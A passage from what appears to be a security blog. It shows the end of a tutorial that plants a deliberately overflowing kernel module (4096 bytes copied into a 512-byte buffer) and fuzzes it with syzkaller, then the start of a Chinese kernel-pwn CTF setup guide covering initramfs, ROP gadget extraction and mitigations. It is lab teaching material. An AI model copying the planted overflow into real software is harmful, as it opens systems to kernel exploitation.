class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">proc_write</span> <span class="params">(<span class="keyword">struct</span> file *proc_file, <span class="type">const</span> <span class="type">char</span> __user *proc_user, <span class="type">size_t</span> n, <span class="type">loff_t</span> *loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *c = kmalloc(<span class="number">512</span>, GFP_KERNEL);</span><br><span class="line">    copy_from_user(c, proc_user, <span class="number">4096</span>);</span><br><span class="line">    printk(<span class="string">&quot;:into write!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">test_op</span> =</span> &#123;</span><br><span class="line">    .proc_open = proc_open,</span><br><span class="line">    .proc_read = proc_read,</span><br><span class="line">    .proc_write = proc_write,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">mod_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    proc_create(<span class="string">&quot;test1&quot;</span>, S_IRUGO|S_IWUGO, <span class="literal">NULL</span>, &amp;test_op);</span><br><span class="line">    printk(<span class="string">&quot;:proc init over!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(mod_init);</span><br></pre></td></tr></table></figure>
<p>save as <code>linux-5.14/drivers/char/testxy.c</code></p>
<p>then append following to</p>
<p><code>linux-5.14/drivers/char/Kconfig</code></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">config</span> <span class="string">TESTXY_MODULE</span></span><br><span class="line">  <span class="string">tristate</span> <span class="string">&quot;dustball&#x27;s vulnability module&quot;</span></span><br><span class="line">  <span class="string">default</span> <span class="string">y</span></span><br><span class="line">  <span class="string">help</span></span><br><span class="line">    <span class="string">This</span> <span class="string">file</span> <span class="string">is</span> <span class="string">to</span> <span class="string">test</span> <span class="string">a</span> <span class="string">buffer</span> <span class="string">overflow</span></span><br></pre></td></tr></table></figure>
<p>then append following to</p>
<p><code>linux-5.14/drivers/char/Makefile</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj-<span class="variable">$(CONFIG_TESTXY_MODULE)</span> += testxy.o</span><br></pre></td></tr></table></figure>
<p>reconfig the kernel with</p>
<p><code>make menuconfig</code></p>
<p>we can find the module <span class="citation"
data-cites="Device">@Device</span> Drivers/dustball's vulnability
module</p>
<blockquote>
<p><code>*</code> means compile into the kernel, chosen</p>
<p><code>M</code> means compile as independent module</p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20241221203510528.png"
alt="image-20241221203510528" />
<figcaption aria-hidden="true">image-20241221203510528</figcaption>
</figure>
<p>recompile the kernel</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j `<span class="built_in">nproc</span>`</span><br></pre></td></tr></table></figure>
<p>rerun the kernel and check the module loaded</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> /proc/test1</span><br></pre></td></tr></table></figure>
<h3 id="provide-syscall-descriptions">2.provide syscall
descriptions</h3>
<p>2.1 save the following syscall descriptions as</p>
<p><code>/syzkaller/sys/linux/proc_testxy.txt</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">include &lt;linux/fs.h&gt;</span><br><span class="line">open$testxy(file ptr[in, <span class="built_in">string</span>[<span class="string">&quot;/proc/test1&quot;</span>]], flags flags[proc_open_flags], mode flags[proc_open_mode]) fd</span><br><span class="line">read$testxy(fd fd, buf buffer[out], count len[buf])</span><br><span class="line">write$testxy(fd fd, buf buffer[in], count len[buf])</span><br><span class="line"></span><br><span class="line">proc_open_flags = O_RDONLY, O_WRONLY, O_RDWR, O_APPEND, FASYNC, O_CLOEXEC, O_CREAT, O_DIRECT, O_DIRECTORY, O_EXCL, O_LARGEFILE, O_NOATIME, O_NOCTTY, O_NOFOLLOW, O_NONBLOCK, O_PATH, O_SYNC, O_TRUNC, __O_TMPFILE</span><br><span class="line">proc_open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure>
<blockquote>
<p>more syzlang :</p>
<p>https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions_syntax.md</p>
</blockquote>
<p>2.2 extract necessary information like syscall numbers and macro
values using syz-extract</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/syzkaller</span><br><span class="line">./bin/syz-extract -os linux -arch amd64 -sourcedir &quot;/path/to/linux-5.14&quot; proc_testxy.txt</span><br></pre></td></tr></table></figure>
<p>check <code>syzkaller/sys/linux/proc.testxy.txt.const</code> when
finished</p>
<p>2.3 generate syzkaller-awareness datastructure in golang</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /path/to/syzkaller</span><br><span class="line">./bin/syz-sysgen</span><br></pre></td></tr></table></figure>
<p>check <code>syzkaller/executor/syscalls.h</code> to find
<code>read$testxy</code> when finished</p>
<p>2.4 rebuild Syzkaller</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make generate </span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<h3 id="start-syzkaller-1">3.start Syzkaller</h3>
<p>edit a test.cfg file</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.img&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sshkey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/image/bullseye.id_rsa&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/syzkaller/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sandbox&quot;</span><span class="punctuation">:</span> <span class="string">&quot;setuid&quot;</span><span class="punctuation">,</span></span><br><span class="line">        	<span class="attr">&quot;enable_syscalls&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">        		<span class="string">&quot;open$testxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        		<span class="string">&quot;read$testxy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        		<span class="string">&quot;write$testxy&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/path/to/linux-5.14/arch/x86/boot/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span> <span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;cmdline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;net.ifnames=0&quot;</span> </span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>then run Syzkaller by</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> syzkaller</span><br><span class="line">./bin/syz-manager -config=./test.cfg -debug</span><br></pre></td></tr></table></figure>
<p>visit http://127.0.0.1:56741/ and wait for crash reports</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20241221210627723.png"
alt="image-20241221210627723" />
<figcaption aria-hidden="true">image-20241221210627723</figcaption>
</figure>
<h2 id="x3-see-also">0x3 see also</h2>
<p>https://blingblingxuanxuan.github.io/2019/10/26/syzkaller/</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/11/26/kernel%20rop/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/26/kernel%20rop/" class="post-title-link" itemprop="url">kernel rop</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-11-26 21:17:00" itemprop="dateCreated datePublished" datetime="2024-11-26T21:17:00+08:00">2024-11-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-12-21 21:09:19" itemprop="dateModified" datetime="2024-12-21T21:09:19+08:00">2024-12-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernel-pwn">kernel pwn</h1>
<h2 id="environment-setup">environment setup</h2>
<p>通常<code>linux kernel pwn</code>题目标是在一个有漏洞的内核模块上搞破坏</p>
<p>赛题会给这么几样东西</p>
<p><code>initramfs.cpio.gz</code>或者类似的名字: 内存文件系统,
通常是基于<code>busybox</code>构建的一个最简的<code>linux</code>
文件系统目录, 其中包含有漏洞的内核模块</p>
<p><code>vmlinuz</code>: 内核镜像</p>
<p><code>run.sh</code>:
<code>qemu</code>启动脚本,<code>qemu</code>会基于上述<code>vmlinuz</code>和<code>initramfs</code>启动一个虚拟机</p>
<h3 id="initramfs.cpio.gz">initramfs.cpio.gz</h3>
<p>这玩意儿是两层打包之后的文件系统,
<code>cpio</code>包外面又套了一个<code>gz</code>包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip initramfs.cpio.gz</span><br></pre></td></tr></table></figure>
<p>得到<code>initramfs.cpio</code>包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idm &lt; ./initramfs.cpio</span><br></pre></td></tr></table></figure>
<p>得到一个<code>linux</code>目录结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop/test<span class="meta"># ls</span></span><br><span class="line">bin  etc  geninitramfs.sh  hackme.ko  init  initramfs.cpio  root  sbin  usr</span><br></pre></td></tr></table></figure>
<p>通常这个目录简单得很</p>
<p><code>hackme.ko</code>: 存在漏洞的内核模块</p>
<p><code>init</code>:
由<code>shell</code>或者<code>c</code>编写的启动脚本</p>
<p><code>bin</code>:
由<code>busybox</code>实现的<code>linux</code>命令集</p>
<p><code>etc</code>:
<code>etc</code>下的<code>inittab</code>或者<code>init.d/rcS</code>中有更多的开机启动项目,
比如设置<code>uid</code>或者加载内核模块等</p>
<h4 id="cpio">cpio</h4>
<h5 id="cpio是什么">cpio是什么?</h5>
<p><code>CPIO(Copy In Copy Out)</code>,
在早期<code>linux</code>系统中用于将多个文档打包成一个文档传输然后再解包</p>
<h5 id="为什么使用cpio">为什么使用<code>cpio</code>?</h5>
<p>内核只认<code>cpio</code>打包的<code>initramfs</code>文件包</p>
<h5 id="如何使用cpio">如何使用<code>cpio</code>?</h5>
<p><code>cpio</code>命令用起来很诡异, 有各种管道或者重定向符号</p>
<p>这是因为<code>cpio</code>默认从标准输入获取数据, 并输出到标准输出</p>
<p>因此将多个文件打包输出成一个文件需要将标准输入输出重定向到文件流</p>
<p><code>cpio</code>有三种工作模式:<code>copy-out,copy-in，copy-pass</code></p>
<p><code>1.copy-out</code>: 把文件打包, 默认输出到标准输出,
通常重定向到文件, 比如</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../initramfs.cpio.gz</span><br></pre></td></tr></table></figure>
<p>首先查找当前目录下所有文件, 获得文件名列表</p>
<p>​ <code>-print0</code>:文件名以<code>\x00</code>分割</p>
<p>然后管道交给cpio归档</p>
<p>​ <code>--null</code>:文件名以<code>\x00</code>分割</p>
<p>​ <code>-o</code>: 输出</p>
<p>​ <code>-v</code>: verbose, 详细模式, 打印工作过程</p>
<p>​ <code>--format=newc</code> : 以<code>newc</code>格式归档</p>
<p>然后管道交给gzip压缩</p>
<p>​ <code>-9</code>最高压缩级别</p>
<p>然后重定向到文件输出</p>
<p>2.<code>copy-in</code>:解包, 默认从标准输入读包,
通常重定向到文件输入, 比如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idm &lt; ./initramfs.cpio</span><br></pre></td></tr></table></figure>
<p>重定向输入为<code>./initramfs.cpio</code>文件</p>
<p><code>-i</code>: 解包</p>
<p><code>-d</code>: 自动建立相应目录</p>
<p><code>-m</code>: 保留文件修改日期</p>
<p>3.<code>copy-pass</code>: 将一个目录树拷贝到另一个目录下,
只是一个搬运</p>
<h4 id="启动项">启动项</h4>
<h5 id="etcinittab">/etc/inittab</h5>
<p><code>inittab</code>可以看作<code>init</code>进程的配置文件，规定<code>init</code>进程需要执行的初始化任务</p>
<figure>
<img
src="https://images2018.cnblogs.com/blog/1436095/201807/1436095-20180709194017319-1896253481.png"
alt="img" />
<figcaption aria-hidden="true">img</figcaption>
</figure>
<p><code>inittab</code>中每一行都按照下述语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">label:runlevel:action:process</span><br></pre></td></tr></table></figure>
<p><code>label</code>: 就是一个命名, 给本行登记项一个唯一标识</p>
<p><code>runlevel</code>: 指定任务运行级</p>
<p><code>action</code>: 指定命令执行时机</p>
<p><code>process</code>: 需要执行的<code>shell</code>命令</p>
<p>比如在<code>kernel-rop</code>这道题中是这样写的</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">::sysinit:/etc/init.d/rcS</span><br><span class="line">::once:-sh -c <span class="string">&#x27;cat /etc/motd; setuidgid 1000 /bin/sh; poweroff&#x27;</span></span><br></pre></td></tr></table></figure>
<p>1.在系统初始化时执行<code>/etc/init.d/rcS</code></p>
<p>2.执行一次打印<code>/etc/motd</code>然后设置普通用户权限(1000),
然后起低权限的<code>shell</code></p>
<h5 id="etcinit.drcs">/etc/init.d/rcS</h5>
<p>这个<code>/etc/init.d/rcS</code>干了啥呢?</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">/bin/busybox --install -s			<span class="comment">#在/usr/bin下面创建ls,mkdir等一系列命令,链接到/usr/bin/busybox</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>						<span class="comment">#set tty, 设置终端上打印行为, 挺怪异的</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chown</span> -R 0:0 /						<span class="comment">#所有文件变更拥有者为root</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /proc &amp;&amp; mount -t proc none /proc</span><br><span class="line"><span class="built_in">mkdir</span> -p /dev  &amp;&amp; mount -t devtmpfs devtmpfs /dev</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp  &amp;&amp; mount -t tmpfs tmpfs /tmp</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict			<span class="comment">#禁止普通用户查看/proc/kallsyms</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict		<span class="comment">#禁止普通用户查看dmesg信息</span></span><br><span class="line"><span class="built_in">chmod</span> 400 /proc/kallsyms						<span class="comment">#/proc/kallsyms对root只读,其他用户不可访问</span></span><br><span class="line"></span><br><span class="line">insmod /hackme.ko								<span class="comment">#加载内核模块</span></span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/hackme							<span class="comment">#允许所有用户读写访问内核模块hackme.ko的接口/dev/hackme</span></span><br></pre></td></tr></table></figure>
<p>由于<code>inittab</code>中已经将用户限制为普通用户(<code>1000</code>),
此时是看不到<code>dmesg</code>以及<code>kallsym</code>的,</p>
<p>因此可以修改<code>inittab</code>中的用户<code>id</code>,从<code>1000</code>改成0,然后重新打包,启动虚拟机,此时就是<code>root</code>用户了</p>
<h3 id="vmlinuz">vmlinuz</h3>
<p><code>vmlinuz</code>就是<code>bzImage</code>,也就是可以引导的内核镜像</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># file vmlinuz</span></span><br><span class="line">vmlinuz: Linux kernel x86 boot executable bzImage, version <span class="number">5.9</span><span class="number">.0</span>-rc6+ (martin@martin) #<span class="number">10</span> SMP Sun Nov <span class="number">22</span> <span class="number">16</span>:<span class="number">47</span>:<span class="number">32</span> CET <span class="number">2020</span>, RO-rootFS, swap_dev <span class="number">0X7</span>, Normal VGA</span><br></pre></td></tr></table></figure>
<p><code>vmlinux</code>是内核<code>elf</code>文件,
而<code>vmlinuz</code>是可引导的, 经过压缩的内核</p>
<p>为了提取内核中的<code>gadget</code>,
我们需要有<code>vmlinux elf</code>文件</p>
<p>可以使用<code>vmlinux-to-elf</code>或者<code>extract-vmlinux</code>工具从<code>vmlinuz</code>中提取<code>vmlinux</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/marin-m/vmlinux-to-elf</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmlinux-to-elf ./vmlinuz ./vmlinux</span><br></pre></td></tr></table></figure>
<p>提取完成后生成vmlinux elf文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# file vmlinuz</span><br><span class="line">vmlinuz: Linux kernel x86 boot executable bzImage, version 5.9.0-rc6+ (martin@martin) <span class="comment">#10 SMP Sun Nov 22 16:47:32 CET 2020, RO-rootFS, swap_dev 0X7, Normal VGA</span></span><br><span class="line">root@Destroyer:/usr/src/kernel-rop# file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), too many program (36106)</span><br></pre></td></tr></table></figure>
<p>接下来使用<code>ROPgadget</code>提取<code>vmlinux</code>中的<code>gadgets</code>,写入文件准备使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./vmlinux &gt; ./gadgets</span><br></pre></td></tr></table></figure>
<p>有一说一, ROPgadget是真慢吧, 用这个ropr快的跟马一样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//github.com/Ben-Lichtman/ropr</span></span><br></pre></td></tr></table></figure>
<h3 id="run.sh">run.sh</h3>
<p>qemu启动虚拟机的脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \							<span class="comment">#内存大小为128MB</span></span><br><span class="line">    -cpu kvm64,+smep,+smap \			<span class="comment">#cpu采用kvm64模型,开启smep和smap保护</span></span><br><span class="line">    -kernel vmlinuz \					<span class="comment">#使用vmlinuz作为内核镜像</span></span><br><span class="line">    -initrd initramfs.cpio.gz \			<span class="comment">#指定内存文件系统</span></span><br><span class="line">    -hdb flag.txt \						<span class="comment">#指定虚拟硬盘</span></span><br><span class="line">    -snapshot \							<span class="comment">#快照模式,不会修改虚拟硬盘内容,只会修改内存</span></span><br><span class="line">    -nographic \						<span class="comment">#不使用图形界面</span></span><br><span class="line">    -monitor /dev/null \				<span class="comment">#禁用qemu monitor接口,实际上是将其重定向到垃圾桶</span></span><br><span class="line">    -no-reboot \						<span class="comment">#即使内核崩溃也不重启</span></span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;</span>	<span class="comment">#额外启动参数,指定控制台设备,开启kaslr,kpti</span></span><br></pre></td></tr></table></figure>
<p>如果需要调试内核,还得加上<code>-s</code>选项,启动<code>gdb</code>调试功能</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -kernel vmlinuz \</span><br><span class="line">    -initrd initramfs.cpio.gz \</span><br><span class="line">    -hda flag.txt \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 kaslr kpti=1 quiet panic=1&quot;</span>\</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>
<p>默认会在本机1234端口上监听gdb附加调试</p>
<p>如果不想使用gef,pwndbg等插件,只使用裸gdb调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb --nx vmlinux</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
<h2 id="kernel-mitigation-features">kernel mitigation features</h2>
<h3 id="canary">canary</h3>
<p><code>canary</code>: 内核堆栈金丝雀</p>
<h3 id="kaslr">kaslr</h3>
<p><code>kaslr</code>: 内核地址随机化</p>
<h4 id="fg-kaslr">FG-KASLR</h4>
<p>函数kaslr</p>
<p>不光内核镜像整体基地址会变</p>
<p>代码段的一些函数也会随机变位置</p>
<h3 id="smep">smep</h3>
<p><code>smep(supervisor mode execution protection)</code>:
内核态时不允许执行用户空间代码</p>
<blockquote>
<p><code>CR4</code>第<code>20</code>位置<code>1</code></p>
<p>开启: <code>-cpu +smep</code></p>
<p>关闭: <code>-append nosmep</code></p>
</blockquote>
<h3 id="smap">smap</h3>
<p><code>smap(supervisor mode access prevention)</code>:
内核态时不允许访问用户空间数据</p>
<blockquote>
<p>CR4第21位置1</p>
<p>开启: <code>-cpu +smap</code></p>
<p>关闭: <code>-append nosmap</code></p>
</blockquote>
<h3 id="kpti">kpti</h3>
<p><code>kpti(kernel page table isolation)</code>, 内核页表隔离</p>
<p>开启时启用两张页表, 在内核态时的页表包含了内核空间与用户空间</p>
<p>在用户态时的页表是只有用户空间的拷贝</p>
<p>开启<code>-append kpti=1</code></p>
<p>关闭<code>-append nopti</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/476px-Kernel_page-table_isolation.svg.png"
alt="File:Kernel page-table isolation.svg" />
<figcaption aria-hidden="true">File:Kernel page-table
isolation.svg</figcaption>
</figure>
<h2 id="context-switch">context switch</h2>
<p>以系统调用与其返回过程为例, 观察上下文切换过程</p>
<h3 id="x86">x86</h3>
<p>以write为例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//write @ linux0.12/lib/write.c</span></span><br><span class="line">_syscall3(<span class="type">int</span>, write, <span class="type">int</span>, fd, <span class="type">const</span> <span class="type">char</span> *, buf, <span class="type">off_t</span>, count)</span><br></pre></td></tr></table></figure>
<p><code>__syscalln</code>表示有n个参数的系统调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_syscall3 @ linux0.12/include/unistd.h</span></span><br><span class="line"><span class="comment">/* 有3个参数的系统调用函数	type_name(atype a,btype b,ctype c) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _syscall3(type, name, atype, a, btype, b, ctype, c) \</span></span><br><span class="line"><span class="meta">type name(atype a, btype b, ctype c) 				\</span></span><br><span class="line"><span class="meta">&#123; 													\</span></span><br><span class="line"><span class="meta">	long __res; 									\</span></span><br><span class="line"><span class="meta">	__asm__ volatile (<span class="string">&quot;int $0x80&quot;</span>					\</span></span><br><span class="line"><span class="meta">		: <span class="string">&quot;=a&quot;</span> (__res) 								\</span></span><br><span class="line"><span class="meta">		: <span class="string">&quot;0&quot;</span> (__NR_##name), <span class="string">&quot;b&quot;</span> ((long)(a)), <span class="string">&quot;c&quot;</span> ((long)(b)), <span class="string">&quot;d&quot;</span> ((long)(c))); \</span></span><br><span class="line"><span class="meta">	<span class="keyword">if</span> (__res &gt;= 0) 								\</span></span><br><span class="line"><span class="meta">		return (type) __res; 						\</span></span><br><span class="line"><span class="meta">	errno = -__res; 								\</span></span><br><span class="line"><span class="meta">	return -1; 										\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
<p>实际上调用约定:</p>
